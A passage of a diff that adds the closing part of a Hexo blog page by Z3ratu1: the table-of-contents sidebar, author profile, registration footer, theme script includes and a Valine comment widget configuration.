class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Markdown-Online"><span class="nav-number">1.4.1.</span> <span class="nav-text">Markdown Online</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Comment"><span class="nav-number">1.4.2.</span> <span class="nav-text">Comment</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FileSystem"><span class="nav-number">1.4.3.</span> <span class="nav-text">FileSystem</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
